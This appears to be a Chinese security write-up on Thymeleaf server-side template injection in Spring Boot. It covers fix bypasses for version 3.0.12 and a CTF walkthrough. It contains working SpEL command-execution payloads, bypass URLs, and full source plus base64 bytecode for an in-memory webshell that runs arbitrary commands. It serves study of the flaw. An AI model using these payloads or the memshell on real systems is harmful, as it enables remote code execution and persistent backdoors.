0x01 Thymeleaf
==============

Thymeleaf是SpringBoot中的一个模版引擎，简单来说就类似于Python中的Jinja2，负责渲染前端页面。

Thymeleaf 是一个现代的 Java 服务器端模板引擎，基于 XML/XHTML/HTML5 语法。该引擎的核心优势之一是 [自然模板](https://www.thymeleaf.org/#natural-templates)。这意味着 Thymeleaf HTML 模板的外观和工作方式与 HTML 一样。这主要是通过在 HTML 标记中使用附加属性来实现的。

之前写JavaWeb和SSM的时候，前端页面可能会用JSP写，但是因为之前项目都是war包部署，而SpringBoot都是jar包且内嵌tomcat，所以是不支持解析jsp文件的。但是如果是编写纯静态的html就很不方便，那么这时候就需要一个模版引擎类似于Jinja2可以通过表达式帮我们把动态的变量渲染到前端页面，我们只需要写一个template即可。这也就是到了SpringBoot为什么官方推荐要使用Thymeleaf处理前端页面了。

表达式
---

- `${...}`，变量表达式 实际上就是 OGNL 或者 SpEL 表达式
- `*{...}`，选择变量表达式
- `#{...}`，消息表达，用于国际化语言
- `@{...}`，链接 URL 表达式，用于在应用程序中设置正确的 URL 路径
- `~{...}`，片段表达式，支持模板的重用

测试 SSTI 的时候我们需要结合使用的背景来进行判断，如果 Web 应用程序基于 Spring，Thymeleaf 使用 Spring EL，如果没有，Thymeleaf 使用 OGNL。，也就是下面两种：

- SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
- OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

根据 Thymeleaf 的 Expression inlining ，也就是表达式内联，具体的格式为`[[...]]` or `[(...)]`，我们可以构造出 `[[${7*7}]]` 这样的测试 Payload

不过这里的 Payload 起作用的机会实际上是非常低的，只有在代码中动态生成模板的时候才能实现，也就是直接 render 外部可控的变量，但是 Thymeleaf 并不允许此类动态生成的模板，并且所有模板都必须是提前创建的，因此如果开发人员想要动态地从字符串创建模板*，* 他们将需要创建自己的 TemplateResolver，有一些太理想情况了。

预处理
---

Thymeleaf 提供了 [预处理](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#preprocessing) 表达式的功能，预处理表达式与普通表达式完全一样，但由双下划线符号包围，如`__${expression}__` ，被预处理的表达式将会被提前执行，并且可以返回当作外层包裹的后续表达式的一部分，例如：`#{selection.__${sel.code}__}`，Thymeleaf 首先进行预处理`${sel.code}`。然后，它使用结果（在本例中为存储值 *ALL* ）作为稍后计算的实数表达式 ( `#{selection.ALL}`) 的一部分。

0x02 SSTI
=========

示例1
---

[片段表达式](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#fragments) 是 Thymeleaf 3.x 版本新增的表达式，具体的利用在官方文档的 [模板布局](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#template-layout) 中进行了具体的介绍。

片段表达式的复用在很多时候也是造成 SSTI 漏洞的主要原因，这里以 [PetClinic](https://github.com/spring-projects/spring-petclinic) 框架为例进行介绍。

在 layout.html 中有一个导航栏，其中利用预处理的方式处理 `${path}` 用于设置正确的链接表达式 `@{}`

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0319d3408f51e365ec84d78bae30fd0d0abdf3dc.png)​

不过这里的 path 来源于提前设置好的 `th:fragment` 我们可以发现这里都是我们不可控的静态路径

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e4a328e5bf6e2fadd491122bce65cf447754f4e2.png)​

不过在 error.html 中也利用片段表达式复用了 latout.html 的这一部分内容

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c024c32a8ad890a08b506631248e9998de6d44eb.png)​

然后我们就可以利用错误的路径写入到预处理里的方式来实现命令执行了，这里还需要注意的是 `@{}` 不会直接解析路径中的 `${}` 但是，`@{}` 会将路径中被括号包裹的内容视作参数，也就是说我们可以打入如下 Payload

```java
/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```

执行我们写在括号内的 `${}` 表达式，也就是导致了 SSTI 漏洞

示例2
---

这是另一种常见的漏洞形式，[Spring View Manipulation Vulnerability](https://github.com/veracode-research/spring-view-manipulation)，简单来说就是在 Spring Framework 中不受限制的 View 也可能会导致 SSTI 。

welcome.html 模板如下

```html

<html lang="en" xmlns:th="http://www.thymeleaf.org">
<div th:fragment="header">
    <h3>Spring Boot Web Thymeleaf Example</h3>
</div>
<div th:fragment="main">
    <span th:text="'Hello, ' + ${message}"></span>
</div>
</html>
```

控制器我们可以这么写，HelloController.java

```java
@Controller
public class HelloController {

    @GetMapping("/")
    public String index(Model model) {
        model.addAttribute("message", "happy birthday");
        return "welcome";
    }
}
```

使用 `@Controller` 和 `@GetMapping("/")` 注解，这个方法会在每一个对根 `url ('/')` 的 HTTP GET 请求中被调用。没有任何参数并返回一个静态字符串“welcome”。Spring 框架将“welcome”解释为 View 名称，并尝试在应用程序资源中查找文件“resources/templates/welcome.html”。如果找到它，它会从模板文件中渲染视图并返回给用户，也就是上面的 welcome.html 。

Thymeleaf 引擎也支持[文件布局](https://www.thymeleaf.org/doc/articles/layouts.html)。例如，

```java
@GetMapping("/main")
public String fragment() {
    return "welcome :: main";
}
```

上面的控制器就可以直接请求 `<div th:fragment="main">` 中的模板内容。

安全角度来看，我们可以想象出这么几种情况：

```java
//将参数直接拼接进路径请求中
@GetMapping("/path")
public String path(@RequestParam String lang) {
    return "user/" + lang + "/welcome"; //template path is tainted
}
//将参数直接拼接进片段表达式的请求中
@GetMapping("/fragment")
public String fragment(@RequestParam String section) {
    return "welcome :: " + section; //fragment is tainted
}
```

`/path` 路径，可以看到这里返回了 root

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7e9d484fcafedd6b66c419a38daec34ff1e85ad5.png)​

`/fragment` 路由下好像会有很多的命令执行不了，因为并没有进入报错的界面，curl 是可以的，可以 curl 到 dnslog

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a6db5f1fc1f1f89597d7e2ba5fe493cc94537692.png)​

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-96d3c8470697bd80365a81c69c8a5de47a3c1f43.png)​

这里还有一个 `/doc/{document}` 路由

```java
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    log.info("Retrieving " + document);
}
```

这里我们可以看到它直接写入了 info，是没有回显的，看起来好像它和 SSTI 根本不沾边。

但是实际上，由于这个 View 的特殊构造，Spring 不知道要使用什么 View 名称，会从请求的 URI 中进行获取，具体来说，DefaultRequestToViewNameTranslator 会调用 getViewName 方法

```java
@Override
public String getViewName(HttpServletRequest request) {
    String lookupPath = this.urlPathHelper.getLookupPathForRequest(request, HandlerMapping.LOOKUP_PATH);
    return (this.prefix + transformPath(lookupPath) + this.suffix);
}
```

因此，当用户控制数据 (URI) 直接查看名称并解析为表达式时，它也会变得易受攻击。

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2ad53afb76ce624f0de82cd90973217dccf27094.png)​

3.0.12 bypass
=============

checkViewNameNotInRequest
-------------------------

在 3.0.12 中新增的 SpringRequestUtils 类中存在一个 checkViewNameNotInRequest 方法，我们在进行 SSTI 的时候一定会进入这里的 checkViewNameNotInRequest 方法

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2b7df547df5f33f12639b12047323504aa0e556f.png)​

这里分别传入了 viewTemplateName 和 request，我们继续步入

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0ae5dc9bba050b308ce4d2a56da43ce4f74369c3.png)​

这里会分别对传入的 viewTemplateName 和 request.getRequestURI 进行 pack 操作，这个操作会将所有的空格去除，并且将所有字母转为小写，具体逻辑不粘了，这里是我们的 viewTemplateName 转为小写后的 vn

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5ef71ee6474f4e94a11e3bf2055aea045b45c2fe.png)

也就是 viewTemplateName 去掉空格转小写之后的

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-dbe5391910ff8eca87828218d94fa3a07dea64e7.png)​

后续的大概逻辑是 getRequestURI 进行解码和 pack，转完之后的形式大致如下

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c55986b084234ee3eabb06709c64fe32c2d0b144.png)​

至此，我们就获得了下面这二位

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-23d632bfb57639a0b62e57fa47daac86bebdfd23.png)​

这个类进行的 check 就是 `requestURI` 不为空，并且不包含 `vn` 的值

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5e74288d5dabbc0266422b10d80a38b64629265c.png)​

这里我们的绕过方式是破坏这里获取到的 `requestURI` 的内容，几个 Payload 如下

```java
/doc//
/doc;/
/doc/;/
```

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ae8eb640fae222223b66a39f7524953c183b398a.png)​

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f0d86b68b78857c0eee6b510c17d3397dce6b84f.png)​

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-229f40bf16874035a6824fb972349b8e3bd95fcf.png)​

都可以完美的绕过，这里可以分析一下 `requestURI` 的由来，这里的 `unescapeUriPath` 最终调用的实际上是 `UriEscapeUtil.unescape` ，在这个方法中首先检测传入的字符中是否是`%`(ESCAPE\_PREFIX)或者`+`，如果是，那么进行二次处理：将 `+` 转义成空格、如果 `%` 的数量大于一，需要一次将它们全部转义，处理完毕后，将处理后的字符串返还回，而 getRequestURI 获取的显然就是 URI 根路径下的全部内容，二者结合，这里完全可以绕过判断

SpringStandardExpressionUtils
-----------------------------

在 3.0.12 版本的 Thymeleaf 中新增了一个 `SpringStandardExpressionUtils`类，其中写了好一个 `containsSpELInstantiationOrStatic` 方法

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-78287ab828fb47bb86bd1c0bb940dd7f2060b681.png)​

对表达式中的内容进行一个判断，主要有下面两个：

1. 检测 new 关键字

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5af290ba398ae95fbf62a7a116a65f8171825182.png)

但是这里我们可以发现这里存在一些安全问题，首先，这里传入的内容为 `spelExpression` ，我们可以很明显地发现，这里的关键字检测是没有进行大小写的考虑的，而我们传入的 `spelExpression` 也是最原始的 SPEL 表达式中的内容，并没有经过 pack 等方法的处理，所以显然，这里我们可以利用 **大小写绕过**

2. 检测 `T(`

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5a4aef8a4604007a9126d581d6a3a348554c17c3.png)​

这里我们可以利用 `` 来进行绕过，`T (`并不会被这里的`n-1`检测到，但同时还可以被 SPEL 表达式识别，这里实际上还可以用其他的符号进行绕过，像`%0a`(换行)、`%09`(制表符)，我们只需要保证这里夹在`T`和`(` 之间的字符不会使原表达式出现问题即可

相关题目 网鼎杯 FindIT
---------------

题目给出 Jar 包，我们本地启动进行调试，并对其进行反编译分析。

可以发现是 SpringBoot 框架，使用了 Thymeleaf 模板

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6760b92219e264d5e30b92870624dfc88b9cb654.png)​

主要控制器逻辑如下：

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3f13c7d5f03216fcf60c5361143e1c69dd5b26b7.png)​

`/` 默认传输了 CTFers 给 Thymeleaf 预留的 变量表达式，

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-45cd837e8cdce4b58d59598dba0233e71564b35f.png)​

对我们来说没什么用了，test 路由直接返回固定字符串，我们重点看下面的两个

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-fcd5702a54b4187ad55c60fadccdb6c9ecc8e038.png)​

这里分别是一个返回的 `Welcome :: path` 的 path 路由

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b5e805ba1cce39a4b2bc025aca0ccaf5fa7f896d.png)​

和一个并没有回显的 `/doc/{data}` ，访问的话总是一个报错界面，这里后端写的是一个 `LoggerFactory.getLogger` 用来在 IDE 控制台打印日志，便于开发，是 slf4j 的一个种应用。

这里用到了 Springboot 的两个参数 `@RequestParam` 以及 `@PathVariable`

> 这里`@RequestParam` 以及 `@PathVariable`实际上就两种获取参数的方式
> 
> - `@RequestParam` 是从 request 里面拿取值
> - `@PathVariable` 是从一个URI模板里面来填充
> 
> 也就是 [http://exmple.com/\*\*?param=RequestParam](http://exmple.com/**?param=RequestParam) **以及 [http://exmple.com/{data](http://exmple.com/%7Bdata)}/ =&gt; <http://exmple.com/>**PathVariable\*\* 具体的设置方式看题目里这个代码也很清楚

同时还有一个 `@ResponseBody` 注解

> `@ResponseBody` 这个注解通常使用在控制层（controller）的方法上，将方法的返回值，以特定的格式写入到response的body区域，进而将数据返回给客户端。
> 
> 当方法上面没有写ResponseBody，底层会将方法的返回值封装为ModelAndView对象，如果返回值是字符串，那么直接将字符串写到客户端；如果是一个对象，会将对象转化为json串，然后写到客户端。

也就是说，我们这里的 path 路由因为有 `@ResponseBody` 注解已经无法实现表达式注入了

`/doc/{data}` 这个路由没有使用@ResponseBody 进行注解，因此即使没有 return 情况下也是存在注入可能的

Thymeleaf SSTI
--------------

在这位置尝试打 Thymeleaf 的Payload `__$%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__::.x`

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d4f1d76f90ecb42109c6361d74520f0cb05b6a1c.png)​

可以在我们本地的终端看到报错 `View name is an executable expression, and it is present in a literal manner in request path or parameters, which is forbidden for security reasons.` 显然是我们的 SSTI payload 被墙了，这里是因为版本问题，thymeleaf 3.0.12 的文档中我们可以看到

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-90a8103e29f2e7cfc9f9a58e8a88cdd508398b6d.png)​

也就是说，SSTI 漏洞修复了，修复方式是再 util 目录下新增了一个 `SpringStandardExpressionUtils.java` 文件来进行防护，具体的内容会写一个专门的分析文章，这里先看题目

我们可以对这里进行绕过，有两种方式 `//path/payload` 以及 `/path;/payload` 不过这里实测出来的并不是这两种，前面的这种并不能绕过，不过 `/path/;/payload` 这种类似于 Shiro 的绕过方式也可以正常绕过，当然原理可能是和后面那种一样的。

```xml
http://127.0.0.1:8080/doc/;/__$%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__::.x
```

不过这里及时绕过了这一处，后续仍然存在问题

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-42169e044c3df0a3516d15058889c35944618bdc.png)​

`Invalid template name specification:` ，这里是因为没有 return `viewTemplateName` 或者 `Fragment` 中的任何一个，具体原因分析一遍之后可能会更清楚一写，先写用到的具体的修复方式是：

```xml
http://127.0.0.1:8080/doc/;/__$%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__::main.x
```

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-eccadba51fb4e708f8e35018b42829f69a53d27e.png)​

又返回了新的报错，这里涉及了 T 这个关键字的绕过，可以参考三梦师傅提交的 issue <https://github.com/thymeleaf/thymeleaf-spring/issues/256>，在T后面添加空格%20进行绕过，因为我这里是在windows起的，所以换一个命令，payload：

```xml
http://127.0.0.1:8080/doc/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22whoami%22)%7D__::main.x
```

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7973472e3a44fe167b206f2d24f16d33908e8efb.png)​

虽然显示 500 错误，但从console 打印的日志可以看出来的确已经执行成功了。

但是这里既没有回显也没有办法进行写入，并且机器不出网，所以这里只能考虑在应用上注入 回显内存马，读取 flag 回显结果。

打回显内存马
------

关于内存马的内容掌握的还是太少，这里只能说是照葫芦画瓢先用用了

<https://www.anquanke.com/post/id/198886>

<https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/>

两篇相关的文章，具体关键要素如下：

1. 改良 SPEL 执行 Java 字节码的 Payload
    
    主要进行了如下优化：
    
    ```plaintext
    解决BCEL/js引擎兼容性问题
    解决base64在不同版本jdk的兼容问题
    可多次运行同类名字节码
    解决可能导致的ClassNotFound问题
    ```
    
    最终 Payload ：
    
    ```java
    #{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
    ```
    
    ![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-69f532adf918a07b3c70a8c498318a5027d9dc3d.png)​
2. Spring 层内存马
    
    [c0ny1](https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/)师傅所写的内存马见 [这里](https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/#0x03-Spring%E5%B1%82%E5%86%85%E5%AD%98%E9%A9%AC) ，大体的逻辑就是利用 `HandlerMapping` 注册一个映射关系，通过映射关系让 `HandlerAdapter` 执行到内存马，最后返回一个 `HandlerResultHandler` 可以处理的结果类型。c0ny1师傅的内存马中`HandlerMapping` 选用了`RequestMappingHandlerMapping`，然后 `RequestMappingHandlerMapping` 的获取使用的方式是**从 SPEL 的上下文的 bean 中获取**，具体见文章内容。最终的结果就是得到了一个 `@RequestMapping("/*")` 等效的内存马
    
    但由于这道题里面并没有用 Spring cloud gateway 组件，所以原代码中利用 `org.springframework.web.reactive.HandlerMapping` 来注册 `registerHandlerMethod` 就会报错找不到对应的类。
3. registerMapping 注册 registerMapping
    
    在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式。
    
    registerMapping 的原型函数如下
    
    ```java
    public void registerMapping(T mapping, Object handler, Method method) {
            if (this.logger.isTraceEnabled()) {
                this.logger.trace("Register \"" + mapping + "\" to " + method.toGenericString());
            }
    
            this.mappingRegistry.register(mapping, handler, method);
        }
    ```
    
    将我们执行命令的方法注册进去即可，也就是：
    
    ```java
    registerMapping.invoke(requestMappingHandlerMapping, requestMappingInfo, new SpringRequestMappingMemshell(), executeCommand);
    ```
    
    还有一部分详细的配置，写在下面了

### 内存马恶意类

c0ny1原版马

```java
public class SpringRequestMappingMemshell {
    public static String doInject(Object requestMappingHandlerMapping) {
        String msg = "inject-start";
        try {
            Method registerHandlerMethod = requestMappingHandlerMapping.getClass().getDeclaredMethod("registerHandlerMethod", Object.class, Method.class, RequestMappingInfo.class);
            registerHandlerMethod.setAccessible(true);
            Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);
            PathPattern pathPattern = new PathPatternParser().parse("/*");
            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition(pathPattern);
            RequestMappingInfo requestMappingInfo = new RequestMappingInfo("", patternsRequestCondition, null, null, null, null, null, null);
            registerHandlerMethod.invoke(requestMappingHandlerMapping, new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);
            msg = "inject-success";
        }catch (Exception e){
            msg = "inject-error";
        }
        return msg;
    }

    public ResponseEntity executeCommand(String cmd) throws IOException {
        String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
        return new ResponseEntity(execResult, HttpStatus.OK);
    }
}
```

改造后马

```java
public class SpringRequestMappingMemshell {
    public static String doInject(Object requestMappingHandlerMapping) {
        String msg = "inject-start";
        try {
            Method registerMapping = requestMappingHandlerMapping.getClass().getMethod("registerMapping", Object.class, Object.class, Method.class);
            registerMapping.setAccessible(true);
            Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);
            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition("/*"); //这里直接注册
            RequestMethodsRequestCondition methodsRequestCondition = new RequestMethodsRequestCondition();
            RequestMappingInfo requestMappingInfo = new RequestMappingInfo(patternsRequestCondition, methodsRequestCondition, null, null, null, null, null);
            registerMapping.invoke(requestMappingHandlerMapping, requestMappingInfo, new SpringRequestMappingMemshell(), executeCommand);
            msg = "inject-success";
        }catch (Exception e){
            e.printStackTrace();
            msg = "inject-error";
        }
        return msg;
    }

    public ResponseEntity executeCommand(@RequestParam(value = "cmd") String cmd) throws IOException {
        String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
        return new ResponseEntity(execResult, HttpStatus.OK);
    }
}
```

主要就是结合了 [这里](https://www.anquanke.com/post/id/198886) 的 registerMapping 注册 registerMapping

```java
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
// 3. 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. 在内存中动态注册 controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("me.landgrey.SSOLogin").newInstance(), method);
```

### 利用 SPEL 加载恶意类

利用 `org.springframework.cglib.core.ReflectUtils#defineClass` 方法，只要传入 类名、类 的字节码 字节数组 和 类加载器就可以加载恶意类

后续的点就是上面提到过的 **从 SPEL 的上下文的 bean 中获取** 类，也就是利用 `SpringRequestMappingMemshell#doInject()` 进行一个 getBean 的行为

```java
T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0).getBean(T (Class).forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"))
```

整体如下：

```java
T (org.springframework.cglib.core.ReflectUtils).defineClass("SpringRequestMappingMemshell",T (org.springframework.util.Base64Utils).decodeFromUrlSafeString("yv66vgAAADQAkwoABgBOCABPCgAGAFAIADAHAFEHAFIHAFMKAAUAVAoABwBVBwBWCAAyBwBXCgAFAFgHAFkIAFoKAA4AWwcAXAcAXQoAEQBeBwBfCgAUAGAKAAoATgoABwBhCABiBwBjCgAZAGQIAGUHAGYKAGcAaAoAZwBpCgBqAGsKABwAbAgAbQoAHABuCgAcAG8HAHAJAHEAcgoAJABzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbDsBAAhkb0luamVjdAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQAPcmVnaXN0ZXJNYXBwaW5nAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAGHBhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAF21ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA/TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcBABJMamF2YS9sYW5nL09iamVjdDsBAANtc2cBABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBSBwBXBwBjAQAQTWV0aG9kUGFyYW1ldGVycwEAPShMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAANjbWQBAApleGVjUmVzdWx0AQAKRXhjZXB0aW9ucwcAdAEAIlJ1bnRpbWVWaXNpYmxlUGFyYW1ldGVyQW5ub3RhdGlvbnMBADZMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RQYXJhbTsBAAV2YWx1ZQEAClNvdXJjZUZpbGUBACFTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsLmphdmEMACcAKAEADGluamVjdC1zdGFydAwAdQB2AQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAwAdwB4DAB5AHoBABxTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsAQAQamF2YS9sYW5nL1N0cmluZwwAewB4AQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAAi8qDAAnAHwBAExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2QMACcAfQEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MACcAfgwAfwCAAQAOaW5qZWN0LXN1Y2Nlc3MBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACBACgBAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAggwAgwCEDACFAIYHAIcMAIgAiQwAJwCKAQACXEEMAIsAjAwAjQCOAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCPDACQAJEMACcAkgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBABFnZXREZWNsYXJlZE1ldGhvZAEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEB9ihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9IZWFkZXJzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0NvbnN1bWVzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RDb25kaXRpb247KVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAjb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXMBAAJPSwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czsBADooTGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOylWACEACgAGAAAAAAADAAEAJwAoAAEAKQAAAC8AAQABAAAABSq3AAGxAAAAAgAqAAAABgABAAAADAArAAAADAABAAAABQAsAC0AAAAJAC4ALwACACkAAAFZAAkABwAAAJQSAkwqtgADEgQGvQAFWQMSBlNZBBIGU1kFEgdTtgAITSwEtgAJEgoSCwS9AAVZAxIMU7YADU67AA5ZBL0ADFkDEg9TtwAQOgS7ABFZA70AErcAEzoFuwAUWRkEGQUBAQEBAbcAFToGLCoGvQAGWQMZBlNZBLsAClm3ABZTWQUtU7YAF1cSGEynAAtNLLYAGhIbTCuwAAEAAwCHAIoAGQADACoAAAA